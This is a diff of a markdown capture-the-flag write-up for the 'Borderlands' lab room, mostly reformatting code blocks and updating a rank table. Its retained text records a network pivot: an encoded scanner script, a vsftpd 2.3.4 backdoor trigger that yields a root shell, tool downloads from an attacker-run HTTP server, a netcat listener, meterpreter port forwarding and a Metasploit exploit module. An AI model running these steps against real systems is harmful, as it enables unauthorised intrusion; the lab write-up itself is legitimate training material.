@@ -1180,7 +1180,6 @@ Port 80:      Open
 python3 ports1.py
 ```
 
-
 <p>
 
 - 172.18.0.1</p>
@@ -1190,28 +1189,28 @@ python3 ports1.py
 echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTYuMS57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUp' | base64 -d > scan2.py
 ```
 
+<br>
+<br>
 
-
-
-
+```bash
 www-data@app:~/html$ chmod +x netcat 
 www-data@app:~/html$ ./netcat 172.16.1.128 21
 220 (vsFTPd 2.3.4)
 USER 123456:)
 331 Please specify the password.
 PASS 123456
+```
 
-
-
-
-
+```bash
 :~/Borderlands# stty raw -echo; fg
 nc -nlvp 4444
 
 www-data@app:~/html$ export TERM=xterm
-www-data@app:~/html$ 
 www-data@app:~/html$ pwd
 /var/www/html
+```
+
+```bash
 www-data@app:~/html$ ls
 CTX_WSUSpect_White_Paper.pdf
 Context_Red_Teaming_Guide.pdf
@@ -1231,6 +1230,9 @@ scan2.py
 t.py
 tmpbxmyl.php
 tmpusntl.php
+```
+
+```bash
 www-data@app:~/html$ ./netcat 172.16.1.128 6200
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
@@ -1260,14 +1262,7 @@ flag.txt
 vsftpd
 cat flag.txt
 {FLAG:Router1:c877f00ce2b886446395150589166dcd}
-
-
-
-
-
-
-
-
+```
 
 
 ```bash
@@ -1310,8 +1305,6 @@ tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /proc/scsi tmpfs ro,relatime 0 0
 tmpfs /sys/firmware tmpfs ro,relatime 0 0
 ```
-
-
 
 ```bash
 www-data@app:/$ ls -lah
@@ -1405,11 +1398,6 @@ ps -eo pid,cmd
   484 nginx: worker process
 ```
 
-
-
-
-
-
 ```bash
 == 172.18.0.1
 Port 21:      Open
@@ -1436,9 +1424,12 @@ Port 2605:      Open
 <img width="1224" height="216" alt="image" src="https://github.com/user-attachments/assets/430c48d3-b2ba-4f98-88d7-5145f6f7d62c" />
 
 
+<br>
+<br>
 
-
+```bash
 /api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
+```
 
 
 ```bash
@@ -1446,52 +1437,50 @@ import urllib.request
 
 url= "http://10.201.76.116:8000/chisel"
 urllib.request.urlretrieve(url, "chisel")
-
+```
 
 <img width="1129" height="148" alt="image" src="https://github.com/user-attachments/assets/725533fa-d91d-4cac-940f-d5821044453d" />
 
+<br>
+<br>
 
-
+```bash
 www-data@app:~/html$ python3 d.py
 python3 d.py
-www-data@app:~/html$ 
+```
 
-root@ip-10-201-76-116:~/Borderlands# python3 -m http.server
+```bash
+:~/Borderlands# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.201.90.105 - - [31/Aug/2025 19:24:24] "GET /chisel HTTP/1.1" 200 -
+```
 
-
-
-
+```bash
 import urllib.request
 
 url= "http://10.201.76.116:8000/nmap-x64.tar.gz"
 urllib.request.urlretrieve(url, "nmap.tar.gz")
+```
 
-
-
+```bash
 www-data@app:~/html$ python3 n.py
 python3 n.py
-www-data@app:~/html$
+```
 
 
-
+```bash
 :~/Borderlands# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.201.90.105 - - [31/Aug/2025 19:26:46] "GET /nmap-x64.tar.gz HTTP/1.1" 200 -
+```
 
-
-
+```bash
 www-data@app:~/html$ tar -xf nmap.tar.gz
-nmap
+```
 
-
-
+```bash
 ./nmap 172.18.0.0/24
-Starting Nmap 7.91 ( https://nmap.org ) at 2025-08-31 18:38 UTC
-Nmap scan report for ip-172-18-0-1.ec2.internal (172.18.0.1)
-Host is up (0.00075s latency).
-Not shown: 997 filtered ports
+...
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
@@ -1504,22 +1493,19 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 256 IP addresses (2 hosts up) scanned in 8.19 seconds
-www-data@app:~/html$ 
+```
 
 
-
+```bash
 www-data@app:~/html$ ./nmap 172.16.1.0/24
-./nmap 172.16.1.0/24
-Starting Nmap 7.91 ( https://nmap.org ) at 2025-08-31 18:36 UTC
+...
 Nmap scan report for app.ctx.ctf (172.16.1.10)
-Host is up (0.00012s latency).
-Not shown: 999 closed ports
+...
 PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
-Host is up (0.00013s latency).
-Not shown: 996 closed ports
+...
 PORT     STATE SERVICE
 21/tcp   open  ftp
 179/tcp  open  bgp
@@ -1527,18 +1513,9 @@ PORT     STATE SERVICE
 2605/tcp open  bgpd
 
 Nmap done: 256 IP addresses (2 hosts up) scanned in 2.52 seconds
-www-data@app:~/html$ 
+```
 
-
-
-
-
-
-
-
-
-
-
+```bash
 meterpreter > shell
 Process 588 created.
 Channel 7 created.
@@ -1546,40 +1523,37 @@ ip route show
 default via 172.18.0.1 dev eth0 
 172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
 172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+```
 
-
-
+```bash
 Terminate channel 6? [y/N]  y
 meterpreter > portfwd add -l 21 -p 21 -r 172.18.0.1
 [*] Forward TCP relay created: (local) :21 -> (remote) 172.18.0.1:21
+```
 
-
-
+```bash
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 [*] No payload configured, defaulting to cmd/unix/interact
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] 127.0.0.1:21 - Banner: 
+```
 
+<br>
+<br>
 
-
-
-
+```bash
 :~/Borderlands# cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe nc.exe
+```
 
-
-
+```bash
 meterpreter > upload nc.exe
 [*] Uploading  : /root/Borderlands/nc.exe -> nc.exe
 [*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
 [*] Completed  : /root/Borderlands/nc.exe -> nc.exe
 meterpreter > 
-
-
-
-
-
+```
 
 ```bash
 cat /etc/mtab
@@ -1589,36 +1563,30 @@ cat /etc/mtab
 /dev/xvda1 /etc/hosts ext4 rw,relatime,discard,data=ordered 0 0
 shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
 /dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
-...
+```
 
-
+```bash
 www-data@app:/$ ls
 ls
 bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
 boot  etc  lib	 media	opt  root  sbin  sys  usr
+```
 
-
-ID        PID  PPID  C STIME TTY          TIME CMD
-root         1     0  0 16:27 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
-mysql       41     1  0 16:27 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
-mysql      407    41  0 16:27 ?        00:00:01 /usr/sbin/mysqld --basedir=/usr 
-root       480     1  0 16:27 ?        00:00:00 php-fpm: master process (/etc/ph
-
-...
-ps -Af
+```bash
+www-data@app:/$ ps -Af
 UID        PID  PPID  C STIME TTY          TIME CMD
 root         1     0  0 Jul20 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
 mysql       41     1  0 Jul20 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
 mysql      427    41  0 Jul20 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 --log-syslog=1 --log-syslog-facility=daemon --log-syslog-tag=
 root       518     1  0 Jul20 ?        00:00:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
-
-
-
+...
 www-data   519   518  0 Jul20 ?        00:00:00 php-fpm: pool www
 www-data   520   518  0 Jul20 ?        00:00:00 php-fpm: pool www
 root       521     1  0 Jul20 ?        00:00:00 nginx: master process nginx -g daemon off;
+```
 
 
+```bash
 www-data@app:/$ ip addr
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
@@ -1633,15 +1601,16 @@ ip addr
     link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
        valid_lft forever preferred_lft forever
+```
 
 
-
-
+```bash
 default via 172.18.0.1 dev eth0 
 172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
 172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2
+```
 
-
+```bash
 cat /sbin/entrypoint.sh
 #!/bin/bash
 
@@ -1742,7 +1711,7 @@ meterpreter >
 | Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
 |:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
 |                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
-| 2025, Sep 9       |Hard 🚩 - <code><strong>Borderlands</strong></code>| 491| 112ⁿᵈ | 5ᵗʰ   |    713ʳᵈ    |     10ᵗʰ    | 125,146  |  954      |    73     |
+| 2025, Sep 9       |Hard 🚩 - <code><strong>Borderlands</strong></code>| 491| 111ˢᵗ | 5ᵗʰ   |    713ʳᵈ    |     10ᵗʰ    | 125,146  |  954      |    73     |
 | 2025, Sep 9       |Medium 🚩 - Forgotten Implant| 491| 112ⁿᵈ | 5ᵗʰ   |    660ᵗʰ    |     10ᵗʰ    | 125,016  |  953      |    73     |
 | 2025, Sep 8       |Easy 🔗 - Web Enumeration| 490| 112ⁿᵈ | 5ᵗʰ   |    663ʳᵈ    |     10ᵗʰ    | 124,986  |  952      |    73     |
 | 2025, Sep 8       |Easy 🔗 - iOS: Forensics| 490| 113ʳᵈ | 5ᵗʰ   |    548ᵗʰ    |     9ᵗʰ    | 124,850  |  951      |    73     |
@@ -1765,7 +1734,7 @@ meterpreter >
 
 <br>
 
-<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/2b1ced37-da26-4405-aa46-8c8760d19007"><br>
+<p align="center">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/2b1ced37-da26-4405-aa46-8c8760d19007"><br>
                                               <img width="1200px" src="https://github.com/user-attachments/assets/5c32e575-5fb1-4ab7-a671-fdc26f1d5bfd"><br><br>
                   Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c461eb6f-6f3d-44c1-8cd6-9ad431a3c28e"><br>
                   Global monthly:    713ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/19cd89aa-fec9-4fbd-a429-809c5b88c9fb"><br>
